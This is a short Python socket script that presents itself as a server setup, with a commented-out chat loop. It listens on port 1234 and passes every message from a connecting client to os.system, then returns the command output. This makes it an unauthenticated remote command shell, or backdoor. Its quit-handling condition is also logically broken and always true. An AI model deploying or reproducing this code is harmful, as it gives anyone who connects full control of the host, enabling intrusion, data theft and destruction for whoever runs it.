import time, socket, sys, os
os.system("cls")
try:
    os.mkdir(".cache")
except:
    pass
print('Setup Server...')
time.sleep(1)
#Get the hostname, IP Address from socket and set Port
soc = socket.socket()
host_name = socket.gethostname()
ip = socket.gethostbyname(host_name)
port = 1234
soc.bind((host_name, port))
print(host_name, '({})'.format(ip))
name = host_name
soc.listen(1) #Try to locate using socket
print('Waiting for incoming connections...')
connection, addr = soc.accept()
print("Received connection from ", addr[0], "(", addr[1], ")\n")
print('Connection Established. Connected From: {}, ({})'.format(addr[0], addr[0]))
#get a connection from client side
client_name = connection.recv(1024)
client_name = client_name.decode()
print(client_name + ' has connected.')
connection.send(name.encode())
message = "ACK"
while True:
   """message = input('Me > ')
   if message == '[bye]':
      message = 'Good Night...'
      connection.send(message.encode())
      print("\n")
      break"""
   connection.send(message.encode())
   message = "ACK"
   message = connection.recv(1024)
   message = message.decode()
   print(client_name, '(remote)>', message)
   # For Quit
   if message == "[quit]":
      print(client_name + " has terminated connection")
      soc.listen(1)  # Try to locate using socket
      print('Waiting for incoming connections...')
      connection, addr = soc.accept()
      print("Received connection from ", addr[0], "(", addr[1], ")\n")
      print('Connection Established. Connected From: {}, ({})'.format(addr[0], addr[0]))
      client_name = connection.recv(1024)
      client_name = client_name.decode()
      print(client_name + ' has connected.')
      connection.send(name.encode())
      message = "ACK"
   # Default
   elif(message!="cls") or (message!="[quit]"):
      message = message +" > .cache/temp.txt"
      status = str(os.system(message))
      if(status == 1):
         message = "Unable to execute command!"
         print(message)
         break
      with open(".cache/temp.txt", "r") as f:
         message = f.read()
      os.system("rm .cache/temp.txt")
      print(message)
   # If Exception case
   else:
      message = "ACK"